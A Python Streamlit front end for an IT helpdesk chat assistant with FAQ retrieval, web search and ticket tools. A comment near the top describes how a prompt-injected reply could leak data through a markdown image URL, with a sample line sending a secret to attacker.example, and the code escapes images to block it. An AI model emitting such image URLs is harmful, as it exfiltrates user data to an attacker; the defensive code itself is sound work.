"""IT Helpdesk Assistant - Streamlit chat UI.

Run (with the MCP server already running in another terminal):
    streamlit run streamlit.py
"""

import json
from pathlib import Path

import streamlit as st
from dotenv import load_dotenv

load_dotenv(Path(__file__).parent / ".env")  # must run before the agent reads ANTHROPIC_API_KEY / VOYAGE_API_KEY

from app_implementation import MCP_SERVER_URL, AgentReply, HelpdeskAgent, ToolEvent  # noqa: E402

# Markdown images load automatically, so a prompt-injected reply could leak data through
# an image URL (e.g. ![](https://attacker.example/?q=secret)). Escaping every image opener
# neutralises all image forms (inline and reference-style). Links are kept: they need a click.
IMAGE_OPENER = "!["
ESCAPED_IMAGE_OPENER = "\\!["

TOOL_ICONS = {"RAG": "📚", "Client tool": "🕒", "Server tool": "🌐", "MCP": "🎫"}
SAMPLE_PROMPTS = [
    "How do I fix network connectivity issues?",
    "My computer is running slow. What should I do?",
    "Search for the latest Windows 11 Wi-Fi troubleshooting steps.",
    "Create a ticket for my laptop running slowly.",
    "Check the status of ticket IT-101.",
    "What is the current date and time?",
]


@st.cache_resource(show_spinner="Indexing the IT FAQ and connecting to the MCP server...")
def get_agent() -> HelpdeskAgent:
    """Built once per server process: embeds the FAQ and discovers the MCP tools."""
    return HelpdeskAgent()


def render_tool_event(event: ToolEvent):
    icon = "❌" if event.is_error else TOOL_ICONS.get(event.kind, "🔧")
    with st.expander(f"{icon} {event.kind}: `{event.name}`"):
        st.caption("Input")
        st.code(json.dumps(event.input, indent=2), language="json")
        if event.output:
            st.caption("Output")
            st.code(event.output, language="json")


def sanitize_markdown(text: str) -> str:
    return text.replace(IMAGE_OPENER, ESCAPED_IMAGE_OPENER)


def render_reply(reply: AgentReply):
    for event in reply.tool_events:
        render_tool_event(event)
    st.markdown(sanitize_markdown(reply.text))


def main():
    st.set_page_config(page_title="IT Helpdesk Assistant", page_icon="🛠️")
    st.title("🛠️ IT Helpdesk Assistant")
    st.caption("RAG over the IT FAQ · Web search · Tickets via the IT Helpdesk MCP Server")

    st.session_state.setdefault("api_messages", [])  # full history sent to Claude
    st.session_state.setdefault("chat_history", [])  # what we display: (role, text | AgentReply)

    try:
        agent = get_agent()
    except Exception as error:
        st.error(
            f"Could not start the assistant: {error}\n\n"
            f"Check that the MCP server is running at {MCP_SERVER_URL} (`python mcp_server.py`) "
            "and that ANTHROPIC_API_KEY and VOYAGE_API_KEY are set in .env."
        )
        st.stop()

    with st.sidebar:
        employee_name = st.text_input("Your name", placeholder="e.g. Rahul")
        st.subheader("Assistant status")
        st.write(f"📚 FAQ sections indexed: **{agent.knowledge_base_size}**")
        st.write("🔧 Tools: " + ", ".join(f"`{name}`" for name in agent.tool_names))
        st.subheader("Try asking")
        for prompt in SAMPLE_PROMPTS:
            st.markdown(f"- {prompt}")
        if st.button("New conversation", type="secondary"):
            st.session_state.api_messages = []
            st.session_state.chat_history = []
            st.rerun()

    for role, content in st.session_state.chat_history:
        with st.chat_message(role):
            # Decide by role, not isinstance(): after a hot reload the cached agent still returns
            # instances of the *old* AgentReply class. Use a statement, not a bare expression,
            # or Streamlit "magic" would echo its return value.
            if role == "assistant":
                render_reply(content)
            else:
                st.markdown(content)

    question = st.chat_input("Describe your IT issue...")
    if not question:
        return

    with st.chat_message("user"):
        st.markdown(question)
    st.session_state.chat_history.append(("user", question))
    history_size = len(st.session_state.api_messages)
    st.session_state.api_messages.append({"role": "user", "content": question})

    with st.chat_message("assistant"):
        with st.spinner("Thinking..."):
            try:
                reply = agent.run(st.session_state.api_messages, employee_name=employee_name.strip())
            except Exception as error:
                # Roll back this turn (question + any partial tool turns) so the history stays valid
                del st.session_state.api_messages[history_size:]
                st.session_state.chat_history.pop()
                st.error(f"Something went wrong while contacting the assistant: {error}")
                return
        render_reply(reply)
    st.session_state.chat_history.append(("assistant", reply))


if __name__ == "__main__":
    main()
